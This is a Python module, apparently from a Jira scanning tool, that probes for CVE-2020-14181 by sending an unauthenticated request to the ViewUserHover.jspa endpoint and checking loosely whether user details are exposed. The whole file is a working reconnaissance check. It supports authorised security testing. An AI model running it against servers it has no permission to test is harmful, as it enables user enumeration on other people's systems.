#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.enums import Severity


class CVE202014181(Exploit):
    cve = "CVE-2020-14181"
    severity = Severity.LOW
    description = "User hover disclosure (ViewUserHover.jspa)"

    def check(self) -> bool:
        r = self.client.get(f"{self.target}/secure/ViewUserHover.jspa?username=Admin")
        # if page responds 200 and doesn't contain a session-timeout / login ask, assume disclosure
        if r.status_code != 200:
            return False
        text = r.text.lower()
        if "your session has timed out" in text or "login" in text:
            return False
        # heuristics: presence of any hover/user info keys
        return "displayname" in text or "user-hover" in text or "hover" in text

    def exploit(self) -> None:
        print("[*] User hover endpoint responds without authentication â€” potential user enumeration")
